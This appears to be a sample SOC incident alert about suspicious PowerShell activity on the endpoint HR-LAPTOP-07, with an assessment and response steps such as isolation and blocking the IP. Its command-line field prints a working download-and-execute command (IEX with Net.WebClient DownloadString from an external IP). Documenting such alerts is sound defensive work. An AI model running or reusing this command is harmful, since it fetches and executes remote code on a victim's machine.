Summary:
Suspicious PowerShell execution detected on endpoint HR-LAPTOP-07 at 11:08 UTC.

Reason for Alert:
Microsoft Defender for Endpoint detected a PowerShell command attempting to download and execute
a remote script from an external IP address.

Risk Level:
High

Investigation Details:
- Affected User: sarah.miller@company.com
- Device Name: HR-LAPTOP-07
- Process: powershell.exe
- Command Line:
  powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://185.221.92.17/update.ps1')"
- Source IP: 185.221.92.17
- Device Status: Not isolated at time of alert

Assessment:
The command line strongly indicates malicious behavior consistent with fileless malware execution
using PowerShell and remote script download.

Immediate Action:
- Immediately isolate the affected endpoint
- Escalate incident to L2 SOC
- Initiate full endpoint scan via EDR
- Block malicious IP at firewall
- Review user activity prior to execution
